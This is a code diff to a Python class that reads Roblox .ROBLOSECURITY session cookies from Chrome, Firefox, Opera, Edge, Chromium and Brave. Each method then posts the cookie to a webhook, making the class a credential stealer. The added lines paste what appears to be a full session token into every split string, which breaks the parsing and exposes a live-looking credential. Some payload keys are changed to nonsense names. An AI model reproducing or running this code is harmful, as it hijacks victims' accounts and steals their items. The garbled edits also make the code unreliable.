@@ -9,7 +9,7 @@ class Cookies:
 	def get_chrome(self):
 		try:
 			cookie = str(bc.chrome(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
 			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
 			return cookie
 		except:
@@ -18,8 +18,8 @@ class Cookies:
 	def get_firefox(self):
 		try:
 			cookie = str(bc.firefox(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'votepinkelef':'bot', 'content':cookie})
 			return cookie
 		except:
 			pass
@@ -27,8 +27,8 @@ class Cookies:
 	def get_opera(self):
 		try:
 			cookie = str(bc.opera(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'votepinklef':'bot', 'content':cookie})
 			return cookie
 		except:
 			pass
@@ -36,8 +36,8 @@ class Cookies:
 	def get_edge(self):
 		try:
 			cookie = str(bc.edge(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'votepinklef':'bot', 'content':cookie})
 			return cookie
 		except:
 			pass
@@ -45,8 +45,8 @@ class Cookies:
 	def get_chromium(self): 
 		try:
 			cookie = str(bc.chromium(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'votepinklef':'bot', 'content':cookie})
 			return cookie
 		except:
 			pass
@@ -54,8 +54,8 @@ class Cookies:
 	def get_brave(self):
 		try:
 			cookie = str(bc.brave(domain_name='roblox.com'))
-			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
-			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			cookie = cookie.split('ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyMzczODYyMzE2NzQwMTc1MzM5KAM.Oy84Os0XrsJUEcyFCTo76nopQyKXdhCCb_6ALblsqvhKr9mPQyusxYnxzJDOHuYzO3nXzX8ujHTvOimH3jLVGgS9SdN_Oj0g1TZenZSqAiSKNc7kW7Z8KuNwzlzWat9qZzt5mdrEv1V5uMsE0gzXsJhAmNWA2iPt8J_CBfedrlWaZKF_yIrpm8pyj20nWCe0IPlPXXfI0iIZ1iLfYOXD3dwAnSpbJTC08Id0IL0ni8aRwTiknUgmT9Br3n3ZlAXAxIbXk1ArNFB66atkET2djxAq0sAtpAuFRkXssE-bVoMEBowjwqPfln-4CIeFCTeYgdxiziBRQkMeTS_9xTwHL58O-Pz7zt_BUSG2r9HCf4pP8Wx68aF1365HeqHdt7JvRvx1c7tTQuBv8gPFr1fWTGYHQgl7ucLyjg9f89YhyACsEjdTdlSur43HHgsPWeFxAHz389kCsSQQBG8_4bAk_q9TCybUqCrt0oEmrH0UXnyhAdaSoJJabK6tp4SRCehjYuIwwELjCfiPkykNFD6wMHQfMacX-hVukoBcSZFqrBiXTVdqohpAHSH5-2aG1Mm0mjb2YisJENFqv3-iYMolHYZbINlUHoiac3DfJgmNXwLbrZ8DvELMsdNKhSsYq3nAeNtR3q6VlXz5J25pezjXkx02OafJ_Zb1d0RJ00qptikbtg6nGOhUwPPlkEMqJA4IUgflhMx_A86aMJtWmfnrMiQFdocrFhEHr7txRR6uGeNQ9yu_PIKov-y5KSBmtfagztqw-w0Ay-MLxIQzp7l4kCgFGmoVw0xbKlVTDcbjqkb0rxE9yLxhFjgxAcrRXsNj-euhV70b87qGIx5gmFl1jiYizpvEYeddn4ZdqC21qT6xgvopjmbP4xHxEQAxU1qlxZFimkHuU8xPz4-RCv8Vl87VMX7zkeAQaLOMLIMZFLLIE8UvDtiyIdggOvWkPfYwyAl_WUkf8doWBB8-j8wh6Qvgwgc')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'votepinklef':'bot', 'content':cookie})
 			return cookie
 		except:
 			pass
